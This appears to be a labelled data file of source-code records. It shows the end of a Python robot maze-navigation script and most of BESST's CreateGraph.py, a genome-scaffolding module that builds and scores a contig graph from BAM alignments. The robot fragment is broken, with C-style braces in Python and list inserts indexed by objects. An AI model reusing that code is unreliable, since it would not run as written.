		if(((hasLeft or hasRight) and hasFront) or (hasLeft and hasRight)):
			#There a new intersection, we need to create a correct amount of nodes
			currentPath.visited = True;
			#current index
			currentIndex = len(nodeList)-1
			#work right to left so ensure we turn left to right
			if(hasRight) {
				newPath = PathNode(currentPath.ID, -90)
				#insert the node after our current parent
				for i, j in enumerate(nodeList):
					if j.ID == newPath.parentID:
						nodeList.insert(j+1,newPath)
			}
			if(hasFront) {
				newPath = PathNode(currentPath.ID, 0)
				#insert the node after our current parent
				for i, j in enumerate(nodeList):
					if j.ID == newPath.parentID:
						nodeList.insert(j+1,newPath)
			}
			if(hasLeft) {
				newPath = PathNode(currentPath.ID, 90)
				#insert the node after our current parent
				for i, j in enumerate(nodeList):
					if j.ID == newPath.parentID:
						nodeList.insert(j+1,newPath)
			}
			
			#Inside the node we store our travel angle and other data...
			#Our decision is always to take the left-most path
			currentNode = nodeList[currentIndex]
			
		else:
			moveFoward(47,47)
			direction = gyroValue();
			print ""gyrovalue: "", (direction-5)%360, forwardAngle
			
			forwardAngle-=90
			#moveTurn(90, 50, [leftMotor, rightMotor])
			leftMotor.run_to_rel_pos(position_sp=225, stop_command=""brake"")
			rightMotor.run_to_rel_pos(position_sp=-225, stop_command=""brake"")
			while any(m.state for m in (leftMotor, rightMotor)):
				sleep(0.1)
			moveFoward(47,47)
			sleep(2)""""""
		detectSkew(gyroValue())
		try:
			c = sys.stdin.read(1)
			print ""Current char"", repr(c)
			#The function tester
			if(c == 'c'):
				rightMotor.stop()
				leftMotor.stop()
				sensorMotor.stop()
				#break
			elif(c == 'a'):
				rotateRobot(-90, 50)
			elif(c == 'd'):
				rotateRobot(90, 50)
			elif(c == 's'):
				rotateRobot(180, 50)
			elif(c == 'w'):
				moveFoward(50,50)
				
		#printSensors()""""""
			
		except IOError: pass
finally:
	termios.tcsetattr(fd, termios.TCSAFLUSH, oldterm)
	fcntl.fcntl(fd, fcntl.F_SETFL, oldflags)

rightMotor.stop()
leftMotor.stop()
sensorMotor.stop()/n/n/n",1
200,fc4187255ea8be704c14b4fe3e57cb8eecdcb59e,"BESST/CreateGraph.py/n/n'''
    Created on Sep 29, 2011

    @author: ksahlin

    This file is part of BESST.

    BESST is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    BESST is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with BESST.  If not, see <http://www.gnu.org/licenses/>.
    '''

import sys
import os
from collections import defaultdict
from math import pi
from time import time

from scipy.stats import ks_2samp
import networkx as nx

import Contig
import Scaffold
from Parameter import counters
from mathstats.normaldist import normal
import GenerateOutput as GO
from mathstats.normaldist.truncatedskewed import param_est
import errorhandle
import plots




def PE(Contigs, Scaffolds, Information, C_dict, param, small_contigs, small_scaffolds, bam_file):
    G = nx.Graph()
    G_prime = nx.Graph()  # If we want to do path extension with small contigs
    print >> Information, 'Parsing BAM file...'

    ##### Initialize contig and scaffold objects ######

    if param.first_lib:
        start_init = time()
        InitializeObjects(bam_file, Contigs, Scaffolds, param, Information, G_prime, small_contigs, small_scaffolds, C_dict)
        print >> Information, 'Time initializing BESST objects: ', time() - start_init

    else:
        #Clean contig_library/scaffold_library
        start_clean = time()
        CleanObjects(Contigs, Scaffolds, param, Information, small_contigs, small_scaffolds)
        print >> Information, 'Time cleaning BESST objects for next library: ', time() - start_clean

    print >> Information, 'Nr of contigs/scaffolds included in scaffolding: ' + str(len(Scaffolds)) #,Scaffolds.keys()
    if len(Scaffolds) == 0:
        if not os.path.isfile(param.output_directory + '/repeats.fa'):
            repeat_file = open(param.output_directory + '/repeats.fa', 'w')
        return(G, G_prime)

    ### initialize graph objects two nodes per contig ""left"" and ""right"" node. ###    
    tot_start = time()

    if param.no_score:
        # Only do path search
        #small contig graph contains all scaffolds
        InitializeGraph(small_scaffolds, G_prime, Information)
        InitializeGraph(Scaffolds, G_prime, Information)        
    elif param.extend_paths:
        # do scoring and extend paths
        InitializeGraph(Scaffolds, G, Information)
        #small contig graph contains all scaffolds
        InitializeGraph(small_scaffolds, G_prime, Information)
        InitializeGraph(Scaffolds, G_prime, Information)
    else:
        # only do scoring
        InitializeGraph(Scaffolds, G, Information)
    print >> Information, 'Total time elapsed for initializing Graph: ', time() - tot_start

    #for coverage computation
    cont_aligned_len = {}
    for contig in Contigs:
        cont_aligned_len[contig] = [0, Contigs[contig].length]

    #if param.extend_paths:
    for contig in small_contigs:
        cont_aligned_len[contig] = [0, small_contigs[contig].length]

    #initialize counters for library
    counter = counters(0, 0, 0, 0, -1, -1, 0)
    fishy_edges = defaultdict(int)
    ctr = 0
    # Create the link edges in the graph by fetching info from bam file  
    print >> Information, 'Reading bam file and creating scaffold graph...'
    staart = time()

    if param.development:
        import guppy
        h = guppy.hpy()
        before_ctg_graph = h.heap()
        print 'Just before creating contig graph:\n{0}\n'.format(before_ctg_graph)

    for alignedread in bam_file:
        # try: #check that read is aligned OBS: not with is_unmapped since this flag is fishy for e.g. BWA
        #     contig1 = bam_file.getrname(alignedread.rname)
        #     contig2 = bam_file.getrname(alignedread.mrnm)
        # except ValueError:
        #     continue
        
        try:
            contig1 = param.contig_index[alignedread.rname]
            contig2 = param.contig_index[alignedread.mrnm]
            #assert contig1 == contig1_old
            #assert contig2 == contig2_old
        except KeyError:
            continue

        #TODO:Repeats (and haplotypes) may have been singled out, we need this statement (or a smarter version of it)
        if (contig1 in Contigs or contig1 in small_contigs) and (contig2 in Contigs or contig2 in small_contigs):
            pass
        else:
            continue

        #TODO: this if-statement is an ad hoc implementation to deal with BWA's buggy SAM-flag reporting
        #if BWA fixes this -> remove this statement. If the links in fishy edges is equal to or ore than
        #the links in the graph G or G'. The edge will be removed.
        if alignedread.is_unmapped and alignedread.is_read1: # and contig1 != contig2: 
            #Some BWA error in mappings can still slip through, these edges are caracterized by very few links                 
            try:
                cont_obj1 = small_contigs[contig1]
                scaf_obj1 = small_scaffolds[cont_obj1.scaffold]
            except KeyError:
                cont_obj1 = Contigs[contig1]
                scaf_obj1 = Scaffolds[cont_obj1.scaffold]
            try:
                cont_obj2 = small_contigs[contig2]
                scaf_obj2 = small_scaffolds[cont_obj2.scaffold]
            except KeyError:
                cont_obj2 = Contigs[contig2]
                scaf_obj2 = Scaffolds[cont_obj2.scaffold]

            if scaf_obj2.name != scaf_obj1.name:
                (side1, side2) = CheckDir(cont_obj1, cont_obj2, alignedread,param)
                #get scaffold name for contig
                s1 = Contigs[contig1].scaffold if contig1 in Contigs else small_contigs[contig1].scaffold
                s2 = Contigs[contig2].scaffold if contig2 in Contigs else small_contigs[contig2].scaffold
                fishy_edges[((s1, side1), (s2, side2))] += 1
                fishy_edges[((s2, side2), (s1, side1))] += 1
                ctr += 1

        ## add to coverage computation if contig is still in the list of considered contigs
        #print contig1, contig2, alignedread.is_read2
        cont_aligned_len[contig1][0] += alignedread.qlen
        if contig1 != contig2 and alignedread.mapq == 0:
            counter.non_unique += 1  # check how many non unique reads out of the useful ones (mapping to two different contigs)

        if contig1 != contig2 and alignedread.is_read2 and not alignedread.is_unmapped and alignedread.mapq >= param.min_mapq:
            if contig1 in Contigs and contig2 in Contigs and Contigs[contig2].scaffold != Contigs[contig1].scaffold:
                cont_obj1 = Contigs[contig1]
                cont_obj2 = Contigs[contig2]
                scaf_obj1 = Scaffolds[cont_obj1.scaffold]
                scaf_obj2 = Scaffolds[cont_obj2.scaffold]
                if not param.no_score:
                    is_dupl = CreateEdge(cont_obj1, cont_obj2, scaf_obj1, scaf_obj2, G, param, alignedread, counter, contig1, contig2)
                else:
                    is_dupl = CreateEdge(cont_obj1, cont_obj2, scaf_obj1, scaf_obj2, G_prime, param, alignedread, counter, contig1, contig2, save_obs=False)

                if param.extend_paths and not is_dupl and not param.no_score:
                    counter.prev_obs1 = -1
                    counter.prev_obs2 = -1
                    CreateEdge(cont_obj1, cont_obj2, scaf_obj1, scaf_obj2, G_prime, param, alignedread, counter, contig1, contig2, save_obs=False)
            elif param.extend_paths:
                try:
                    cont_obj1 = small_contigs[contig1]
                    scaf_obj1 = small_scaffolds[cont_obj1.scaffold]
                    value1 = 1
                except KeyError:
                    cont_obj1 = Contigs[contig1]
                    scaf_obj1 = Scaffolds[cont_obj1.scaffold]
                    value1 = 0
                try:
                    cont_obj2 = small_contigs[contig2]
                    scaf_obj2 = small_scaffolds[cont_obj2.scaffold]
                    value2 = 1
                except KeyError:
                    cont_obj2 = Contigs[contig2]
                    scaf_obj2 = Scaffolds[cont_obj2.scaffold]
                    value2 = 0
                if value1 and value2 and scaf_obj1 != scaf_obj2:
                    CreateEdge(cont_obj1, cont_obj2, scaf_obj1, scaf_obj2, G_prime, param, alignedread, counter, contig1, contig2, save_obs=False)
                elif value1 and not value2:
                    CreateEdge(cont_obj1, cont_obj2, scaf_obj1, scaf_obj2, G_prime, param, alignedread, counter, contig1, contig2,save_obs=False)
                elif not value1 and value2:
                    CreateEdge(cont_obj1, cont_obj2, scaf_obj1, scaf_obj2, G_prime, param, alignedread, counter, contig1, contig2,save_obs=False)


            elif contig1 in Contigs and contig2 in Contigs and Contigs[contig2].scaffold != Contigs[contig1].scaffold:
########################Use to validate scaffold in previous step here ############
                pass
    print >> Information, 'ELAPSED reading file:', time() - staart
    print >> Information, 'NR OF FISHY READ LINKS: ', ctr

    print >> Information, 'Number of USEFUL READS (reads mapping to different contigs uniquly): ', counter.count
    print >> Information, 'Number of non unique reads (at least one read non-unique in read pair) that maps to different contigs (filtered out from scaffolding): ', counter.non_unique
    print >> Information, 'Reads with too large insert size from ""USEFUL READS"" (filtered out): ', counter.reads_with_too_long_insert
    print >> Information, 'Initial number of edges in G (the graph with large contigs): ', len(G.edges())
    print >> Information, 'Initial number of edges in G_prime (the full graph of all contigs before removal of repats): ', len(G_prime.edges())
    
    if param.detect_duplicate:
        print >> Information, 'Number of duplicated reads indicated and removed: ', counter.nr_of_duplicates

    if param.development:
        h = guppy.hpy()
        after_ctg_graph = h.heap()
        print 'Just after creating contig graph:\n{0}\n'.format(after_ctg_graph)


##### Calc coverage for all contigs with current lib here #####
    sum_x = 0
    sum_x_sq = 0
    n = 0
    cov = []
    leng = []
    for contig in cont_aligned_len:
        cont_coverage = cont_aligned_len[contig][0] / float(cont_aligned_len[contig][1])
        try:
            Contigs[contig].coverage = cont_coverage
            cov.append(cont_coverage)
            leng.append(Contigs[contig].length)
        except KeyError:
            small_contigs[contig].coverage = cont_coverage
            cov.append(cont_coverage)
            leng.append(small_contigs[contig].length)


        sum_x += cont_coverage
        sum_x_sq += cont_coverage ** 2
        n += 1

    del cont_aligned_len

    mean_cov, std_dev_cov = CalculateMeanCoverage(Contigs, Information, param)
    param.mean_coverage = mean_cov
    param.std_dev_coverage = std_dev_cov
    if param.first_lib:
        Contigs, Scaffolds, G = RepeatDetector(Contigs, Scaffolds, G, param, G_prime, small_contigs, small_scaffolds, Information)

    print >> Information, 'Number of edges in G (after repeat removel): ', len(G.edges())
    print >> Information, 'Number of edges in G_prime (after repeat removel): ', len(G_prime.edges())

    ### Remove edges created by false reporting of BWA ###
    RemoveBugEdges(G, G_prime, fishy_edges, param, Information)

    print >> Information, 'Number of edges in G (after filtering for buggy flag stats reporting): ', len(G.edges())
    print >> Information, 'Number of edges in G_prime  (after filtering for buggy flag stats reporting): ', len(G_prime.edges())

    if param.development:
        h = guppy.hpy()
        after_coverage = h.heap()
        print 'Just after calc coverage:\n{0}\n'.format(after_coverage)

    ## Score edges in graph
    plot = 'G'
    if not param.no_score:
        GiveScoreOnEdges(G, Scaffolds, small_scaffolds, Contigs, param, Information, plot)
    #plot = 'G_prime'
    #GiveScoreOnEdges(G_prime, Scaffolds, small_scaffolds, Contigs, param, Information, plot)


    #Remove all edges with link support less than 3 to be able to compute statistics: 
    cntr_sp = 0
    for edge in G_prime.edges():
        if G_prime[edge[0]][edge[1]]['nr_links'] != None:
            if G_prime[edge[0]][edge[1]]['nr_links'] < param.edgesupport:
                G_prime.remove_edge(edge[0], edge[1])
                cntr_sp += 1
    print >> Information, 'Number of fishy edges in G_prime', cntr_sp

    print >> Information, 'Number of edges in G_prime  (after removing edges under -e threshold (if not specified, default is -e 3): ', len(G_prime.edges())

    if param.development:
        h = guppy.hpy()
        after_scoring = h.heap()
        print 'After scoring:\n{0}\n'.format(after_scoring)

    return(G, G_prime)


def GiveScoreOnEdges(G, Scaffolds, small_scaffolds, Contigs, param, Information, plot):

    span_score_obs = []
    std_dev_score_obs = []
    gap_obs = []
    nr_link_obs = []
    cnt_sign = 0

    if param.print_scores:
        score_file = open(os.path.join(param.output_directory,""score_file_pass_{0}.tsv"".format(param.pass_number)), ""w"")
        print >>score_file, ""{0}\t{1}\t{2}\t{3}\t{4}\t{5}\t{6}\t{7}"".format(""scf1/ctg1"", ""o1"", ""scf2/ctg2"", ""o2"", ""gap"", ""link_variation_score"", ""link_dispersity_score"", ""number_of_links"")

    for edge in G.edges():
        mean_ = 0
        std_dev = 0
        if G[edge[0]][edge[1]]['nr_links'] != None:
            n = G[edge[0]][edge[1]]['nr_links']
            obs_squ = G[edge[0]][edge[1]]['obs_sq']
            mean_ = G[edge[0]][edge[1]]['obs'] / float(n)
            data_observation = (n * param.mean_ins_size - G[edge[0]][edge[1]]['obs']) / float(n)
            try:
                len1 = Scaffolds[ edge[0][0] ].s_length
            except KeyError:
                len1 = small_scaffolds[ edge[0][0] ].s_length
            try:
                len2 = Scaffolds[ edge[1][0] ].s_length
            except KeyError:
                len2 = small_scaffolds[ edge[1][0] ].s_length
            if 2 * param.std_dev_ins_size < len1 and 2 * param.std_dev_ins_size < len2:
                gap = param_est.GapEstimator(param.mean_ins_size, param.std_dev_ins_size, param.read_len, mean_, len1, len2)
            else:
                gap = data_observation

            G[edge[0]][edge[1]]['gap'] = int(gap)
            if -gap > len1 or -gap > len2:
                G[edge[0]][edge[1]]['score'] = 0
                continue

            #std_dev_d_eq_0 = param_est.tr_sk_std_dev(param.mean_ins_size, param.std_dev_ins_size, param.read_len, len1, len2, gap)

            if 2 * param.std_dev_ins_size < len1 and 2 * param.std_dev_ins_size < len2:
                std_dev_d_eq_0 = param_est.tr_sk_std_dev(param.mean_ins_size, param.std_dev_ins_size, param.read_len, len1, len2, gap)
            else:
                std_dev_d_eq_0 = 2 ** 32

            try:
                std_dev = ((obs_squ - n * mean_ ** 2) / (n - 1)) ** 0.5
                #chi_sq = (n - 1) * (std_dev ** 2 / std_dev_d_eq_0 ** 2)
            except ZeroDivisionError:
                std_dev = 2 ** 32
                #chi_sq = 0


            try:
                l1 = G[edge[0]][edge[1]][Scaffolds[edge[0][0]].name]
                del G[edge[0]][edge[1]][Scaffolds[edge[0][0]].name]
            except KeyError:
                l1 = G[edge[0]][edge[1]][small_scaffolds[edge[0][0]].name]
                del G[edge[0]][edge[1]][small_scaffolds[edge[0][0]].name]
            try:
                l2 = G[edge[0]][edge[1]][Scaffolds[edge[1][0]].name]
                del G[edge[0]][edge[1]][Scaffolds[edge[1][0]].name]
            except KeyError:
                l2 = G[edge[0]][edge[1]][small_scaffolds[edge[1][0]].name]
                del G[edge[0]][edge[1]][small_scaffolds[edge[1][0]].name]


            l1.sort()
            n_obs = len(l1)
            l1_mean = sum(l1) / float(n_obs)
            #l1_median = l1[len(l1) / 2]
            l1 = map(lambda x: x - l1_mean, l1)
            #l1 = map(lambda x: x - l1_median, l1)
            max_obs2 = max(l2)
            l2.sort(reverse=True)
            l2 = map(lambda x: abs(x - max_obs2), l2)
            l2_mean = sum(l2) / float(n_obs)
            #l2_median = l2[len(l2) / 2]
            l2 = map(lambda x: x - l2_mean, l2)
            #l2 = map(lambda x: x - l2_median, l2)
            KS_statistic, p_value = ks_2samp(l1, l2)


            #M_W_statistic, p_val = mannwhitneyu(l1, l2)

            #diff = map(lambda x: abs(abs(x[1]) - abs(x[0])), zip(l1, l2))
            #sc = sum(diff) / len(diff)

            if len(l1) < 3:
                span_score = 0
            else:
                span_score = 1 - KS_statistic

            try:
                std_dev_score = min(std_dev / std_dev_d_eq_0, std_dev_d_eq_0 / std_dev) #+ span_score #+ min(n/E_links, E_links/float(n))
            except ZeroDivisionError:
                std_dev_score = 0
                sys.stderr.write(str(std_dev) + ' ' + str(std_dev_d_eq_0) + ' ' + str(span_score) + '\n')

            G[edge[0]][edge[1]]['score'] = std_dev_score + span_score if std_dev_score > 0.5 and span_score > 0.5 else 0

            if param.plots:
                span_score_obs.append(span_score)
                std_dev_score_obs.append(std_dev_score)
                gap_obs.append(gap)
                nr_link_obs.append(n_obs)

            if param.print_scores:
                if edge[0][1] == 'R':
                    contig_objects = Scaffolds[edge[0][0]].contigs
                    contig_names = map(lambda x: x.name, contig_objects)
                    scf1 = "";"".join(contig_names)
                    contig_directions_bool = map(lambda x: x.direction, contig_objects)
                    contig_directions1 = "";"".join(map(lambda x: '+' if True else '-', contig_directions_bool))

                else:
                    contig_objects = Scaffolds[edge[0][0]].contigs[::-1]
                    contig_names = map(lambda x: x.name, contig_objects)
                    scf1 ="";"".join(contig_names)
                    contig_directions_bool = map(lambda x: x.direction, contig_objects)
                    contig_directions1 = "";"".join(map(lambda x: '+' if False else '-', contig_directions_bool))

                if edge[1][1] == 'L':
                    contig_objects = Scaffolds[edge[1][0]].contigs
                    contig_names = map(lambda x: x.name, contig_objects)
                    scf2 ="";"".join(contig_names)
                    contig_directions_bool = map(lambda x: x.direction, contig_objects)
                    contig_directions2 = "";"".join(map(lambda x: '+' if True else '-', contig_directions_bool))

                else:
                    contig_objects = Scaffolds[edge[1][0]].contigs[::-1]
                    contig_names = map(lambda x: x.name, contig_objects)
                    scf2 ="";"".join(contig_names)
                    contig_directions_bool = map(lambda x: x.direction, contig_objects)
                    contig_directions2 = "";"".join(map(lambda x: '+' if False else '-', contig_directions_bool))

                print >>score_file, ""{0}\t{1}\t{2}\t{3}\t{4}\t{5}\t{6}\t{7}"".format(scf1, contig_directions1, scf2, contig_directions2, gap, std_dev_score, span_score, n_obs)

    if param.print_scores:
        score_file.close()

    if param.plots:
        plots.histogram(span_score_obs, param, bins=20, x_label='score', y_label='frequency', title='Dispersity_score_distribuion' + plot + '.' + param.bamfile.split('/')[-1])
        plots.histogram(std_dev_score_obs, param, bins=20, x_label='score', y_label='frequency', title='Standard_deviation_score_distribuion' + plot + '.' + param.bamfile.split('/')[-1])
        plots.dot_plot(std_dev_score_obs, span_score_obs, param, x_label='std_dev_score_obs', y_label='span_score_obs', title='Score_correlation' + plot + '.' + param.bamfile.split('/')[-1])
        plots.dot_plot(std_dev_score_obs, gap_obs, param, x_label='std_dev_score_obs', y_label='estimated gap size', title='Gap_to_sigma' + plot + '.' + param.bamfile.split('/')[-1])
        plots.dot_plot(span_score_obs, gap_obs, param, x_label='span_score_obs', y_label='estimated gap size', title='Gap_to_span' + plot + '.' + param.bamfile.split('/')[-1])
        plots.dot_plot(span_score_obs, nr_link_obs, param, x_label='span_score_obs', y_label='Number links', title='Obs_to_span' + plot + '.' + param.bamfile.split('/')[-1])

    for edge in G.edges():
        if G[edge[0]][edge[1]]['nr_links'] != None:
            try:
                G[edge[0]][edge[1]]['score']
            except KeyError:
                sys.stderr.write(str(G[edge[0]][edge[1]]) + ' ' + str(Scaffolds[edge[0][0]].s_length) + ' ' + str(Scaffolds[edge[1][0]].s_length))
    print >> Information, 'Number of significantly spurious edges:', cnt_sign

    return()





def CheckDir(cont_obj1, cont_obj2, alignedread, param):
    (read_dir, mate_dir) = (not alignedread.is_reverse, not alignedread.mate_is_reverse)
    cont_dir1 = cont_obj1.direction  #if pos : L if neg: R
    #position2 cont2/scaf2                        
    cont_dir2 = cont_obj2.direction
    if param.orientation == 'fr':
        (obs1, obs2, scaf_side1, scaf_side2) = PosDirCalculatorPE(cont_dir1, read_dir, 0, 0, 0, 0, cont_dir2, mate_dir, 0, 0, 0, 0, 0)
    else:
        (obs1, obs2, scaf_side1, scaf_side2) = PosDirCalculatorMP(cont_dir1, read_dir, 0, 0, 0, 0, cont_dir2, mate_dir, 0, 0, 0, 0, 0)

    return(scaf_side1, scaf_side2)

def RemoveBugEdges(G, G_prime, fishy_edges, param, Information):
    edges_removed = 0
    for edge_tuple, nr_links in fishy_edges.items():
        if param.extend_paths:
            if edge_tuple[1] in G_prime and edge_tuple[0] in G_prime[edge_tuple[1]]:
                if nr_links >= G_prime[edge_tuple[0]][edge_tuple[1]]['nr_links']:
                    G_prime.remove_edge(edge_tuple[0], edge_tuple[1])
                    edges_removed += 1
            if edge_tuple[1] in G and edge_tuple[0] in G[edge_tuple[1]]:
                if nr_links >= G[edge_tuple[0]][edge_tuple[1]]['nr_links']:
                    G.remove_edge(edge_tuple[0], edge_tuple[1])
        else:
            if edge_tuple[1] in G and edge_tuple[0] in G[edge_tuple[1]]:
                if nr_links >= G[edge_tuple[0]][edge_tuple[1]]['nr_links']:
                    G.remove_edge(edge_tuple[0], edge_tuple[1])
                    edges_removed += 1
    print >> Information, 'Number of BWA buggy edges removed: ', edges_removed
    del fishy_edges
    return()

def InitializeGraph(dict_with_scaffolds, graph, Information):
    cnt = 1
    start1 = time()
    for scaffold_ in dict_with_scaffolds:
        graph.add_edge((scaffold_, 'L'), (scaffold_, 'R'), nr_links=None)    #this is a scaffold object but can be both a single contig or a scaffold.
        graph.node[(scaffold_, 'L')]['length'] = dict_with_scaffolds[scaffold_].s_length
        graph.node[(scaffold_, 'R')]['length'] = dict_with_scaffolds[scaffold_].s_length
        if cnt % 100000 == 0 and cnt > 0:
            elapsed = time() - start1
            print >> Information, 'Total nr of keys added: ', cnt, 'Time for adding last 100 000 keys: ', elapsed
            start1 = time()
        cnt += 1
    return()

# def constant_large():
#     return 2 ** 32
# def constant_small():
#     return -1

def InitializeObjects(bam_file, Contigs, Scaffolds, param, Information, G_prime, small_contigs, small_scaffolds, C_dict):
    singeled_out = 0
    contig_threshold = param.contig_threshold
    cont_lengths = bam_file.lengths
    cont_lengths = [int(nr) for nr in cont_lengths]  #convert long to int object
    cont_names = bam_file.references

    #Calculate NG50 and LG 50
    param.tot_assembly_length = sum(cont_lengths)
    sorted_lengths = sorted(cont_lengths, reverse=True)
    N50, L50 = CalculateStats(sorted_lengths, [], param, Information)
    param.current_L50 = L50
    param.current_N50 = N50
    #extend_paths = param.extend_paths
    counter = 0
    start = time()
    for i in range(0, len(cont_names)):
        counter += 1
        if counter % 100000 == 0:
            print >> Information, 'Time adding 100k keys', time() - start
            start = time()
        if cont_names[i] not in  C_dict:
            #errorhandle.unknown_contig(cont_names[i])
            continue

        if cont_lengths[i] >= contig_threshold:
            C = Contig.contig(cont_names[i])   # Create object contig
            C.length = cont_lengths[i]
            C.sequence = C_dict[cont_names[i]]
            del C_dict[cont_names[i]]
            scaf_length = C.length        # Initially, scaffold consists of only this contig    
            C.direction = True              # always in same direction first, False=reverse
            C.position = 0                  #position always 0
            #C.links = {}
            Contigs[C.name] = C              # Create a dict with name as key and the object container as value
            S = Scaffold.scaffold(param.scaffold_indexer, [C], scaf_length)  # Create object scaffold
            Scaffolds[S.name] = S
            C.scaffold = S.name
            param.scaffold_indexer += 1
        else:
            if cont_lengths[i] > 0: #In case of contigs with size 0 (due to some error in fasta file)
                C = Contig.contig(cont_names[i])   # Create object contig
                C.length = cont_lengths[i]
                C.sequence = C_dict[cont_names[i]]
                del C_dict[cont_names[i]]
                scaf_length = C.length        # Initially, scaffold consists of only this contig    
                C.direction = True              # always in same direction first, False=reverse
                C.position = 0                  #position always 0
                small_contigs[C.name] = C              # Create a dict with name as key and the object container as value
                S = Scaffold.scaffold(param.scaffold_indexer, [C], scaf_length)  # Create object scaffold
                small_scaffolds[S.name] = S
                C.scaffold = S.name
                param.scaffold_indexer += 1
                singeled_out += 1
    del C_dict


    print >> Information, 'Nr of contigs that was singeled out due to length constraints ' + str(singeled_out)
    return()

def CleanObjects(Contigs, Scaffolds, param, Information, small_contigs, small_scaffolds):
    singeled_out = 0
    scaf_lengths = [Scaffolds[scaffold_].s_length for scaffold_ in Scaffolds.keys()]
    sorted_lengths = sorted(scaf_lengths, reverse=True)
    scaf_lengths_small = [small_scaffolds[scaffold_].s_length for scaffold_ in small_scaffolds.keys()]
    sorted_lengths_small = sorted(scaf_lengths_small, reverse=True)
    N50, L50 = CalculateStats(sorted_lengths, sorted_lengths_small, param, Information)
    param.current_L50 = L50
    param.current_N50 = N50
    for scaffold_ in Scaffolds.keys(): #iterate over keys in hash, so that we can remove keys while iterating over it
        if Scaffolds[scaffold_].s_length < param.contig_threshold:
            ###  Switch from Scaffolds to small_scaffolds (they can still be used in the path extension)
            ### Remove Scaf_obj from Scaffolds and Contig_obj from contigs
            S_obj = Scaffolds[scaffold_]
            list_of_contigs = S_obj.contigs   #list of contig objects contained in scaffold object
            GO.ChangeToSmallContigs(Contigs, list_of_contigs, small_contigs)
            scaf_obj = Scaffolds[scaffold_]
            small_scaffolds[scaffold_] = scaf_obj
            del Scaffolds[scaffold_]
            singeled_out += 1

    print >> Information, 'Nr of contigs/scaffolds that was singeled out due to length constraints ' + str(singeled_out)
    return()

def CreateEdge(cont_obj1, cont_obj2, scaf_obj1, scaf_obj2, G, param, alignedread, counter, contig1, contig2, save_obs=True):
    if alignedread.mapq == 0:
        counter.non_unique_for_scaf += 1
    counter.count += 1
    (read_dir, mate_dir) = (not alignedread.is_reverse, not alignedread.mate_is_reverse)
    #Calculate actual position on scaffold here
    #position1 cont/scaf1
    cont_dir1 = cont_obj1.direction  #if pos : L if neg: R
    cont1_pos = cont_obj1.position
    readpos = alignedread.pos
    cont1_len = cont_obj1.length
    s1len = scaf_obj1.s_length
    #position2 cont2/scaf2                        
    cont_dir2 = cont_obj2.direction
    cont2_pos = cont_obj2.position
    matepos = alignedread.mpos
    cont2_len = cont_obj2.length
    s2len = scaf_obj2.s_length
    if param.orientation == 'fr':
        (obs1, obs2, scaf_side1, scaf_side2) = PosDirCalculatorPE(cont_dir1, read_dir, cont1_pos, readpos, s1len, cont1_len, cont_dir2, mate_dir, cont2_pos, matepos, s2len, cont2_len, param.read_len)
    else:
        (obs1, obs2, scaf_side1, scaf_side2) = PosDirCalculatorMP(cont_dir1, read_dir, cont1_pos, readpos, s1len, cont1_len, cont_dir2, mate_dir, cont2_pos, matepos, s2len, cont2_len, param.read_len)

    if obs1 == counter.prev_obs1 and obs2 == counter.prev_obs2:
        counter.nr_of_duplicates += 1
        if param.detect_duplicate:
            return(1)

    if obs1 + obs2 < param.mean_ins_size + 6 * param.std_dev_ins_size and obs1 > 25 and obs2 > 25:
        if (scaf_obj2.name, scaf_side2) not in G[(scaf_obj1.name, scaf_side1)]:
            G.add_edge((scaf_obj2.name, scaf_side2), (scaf_obj1.name, scaf_side1), nr_links=1, obs=obs1 + obs2)
            G.edge[(scaf_obj1.name, scaf_side1)][(scaf_obj2.name, scaf_side2)]['obs_sq'] = (obs1 + obs2) ** 2
            G.edge[(scaf_obj1.name, scaf_side1)][(scaf_obj2.name, scaf_side2)]['observations'] = [obs1+obs2]

            if save_obs:
                G.edge[(scaf_obj1.name, scaf_side1)][(scaf_obj2.name, scaf_side2)][scaf_obj1.name] = [obs1]
                G.edge[(scaf_obj1.name, scaf_side1)][(scaf_obj2.name, scaf_side2)][scaf_obj2.name] = [obs2]
        elif save_obs:
            G.edge[(scaf_obj1.name, scaf_side1)][(scaf_obj2.name, scaf_side2)]['nr_links'] += 1
            G.edge[(scaf_obj1.name, scaf_side1)][(scaf_obj2.name, scaf_side2)]['obs'] += obs1 + obs2
            G.edge[(scaf_obj1.name, scaf_side1)][(scaf_obj2.name, scaf_side2)][scaf_obj1.name].append(obs1)
            G.edge[(scaf_obj1.name, scaf_side1)][(scaf_obj2.name, scaf_side2)][scaf_obj2.name].append(obs2)
            G.edge[(scaf_obj1.name, scaf_side1)][(scaf_obj2.name, scaf_side2)]['obs_sq'] += (obs1 + obs2) ** 2
            G.edge[(scaf_obj1.name, scaf_side1)][(scaf_obj2.name, scaf_side2)]['observations'].append(obs1+obs2)

        else:
            G.edge[(scaf_obj1.name, scaf_side1)][(scaf_obj2.name, scaf_side2)]['nr_links'] += 1
            G.edge[(scaf_obj1.name, scaf_side1)][(scaf_obj2.name, scaf_side2)]['obs'] += obs1 + obs2
            G.edge[(scaf_obj1.name, scaf_side1)][(scaf_obj2.name, scaf_side2)]['obs_sq'] += (obs1 + obs2) ** 2
            G.edge[(scaf_obj1.name, scaf_side1)][(scaf_obj2.name, scaf_side2)]['observations'].append(obs1+obs2)


    else:
        counter.reads_with_too_long_insert += 1

        ## add to haplotype graph here!!

    counter.prev_obs1 = obs1
    counter.prev_obs2 = obs2
    return(0)


def CalculateStats(sorted_contig_lengths, sorted_contig_lengths_small, param, Information):
    cur_length = 0
    nr_conts = 0
    L50 = 0
    N50 = 0
    for contig_length in sorted_contig_lengths:
        cur_length += contig_length
        nr_conts += 1
        if cur_length >= param.tot_assembly_length / 2.0:
            N50 = contig_length
            L50 = nr_conts
            break
    if N50 == 0:
        for contig_length in sorted_contig_lengths_small:
            cur_length += contig_length
            nr_conts += 1
            if cur_length >= param.tot_assembly_length / 2.0:
                N50 = contig_length
                L50 = nr_conts
                break
    print >> Information, 'L50: ', L50, 'N50: ', N50, 'Initial contig assembly length: ', param.tot_assembly_length
    return(N50, L50)

def CalculateMeanCoverage(Contigs, Information, param):
    # tuples like (cont lenght, contig name)
    list_of_cont_tuples = [(Contigs[contig].length, contig) for contig in Contigs]
    #sorted as longest first
    list_of_cont_tuples = sorted(list_of_cont_tuples, key=lambda tuple: tuple[0], reverse=True)
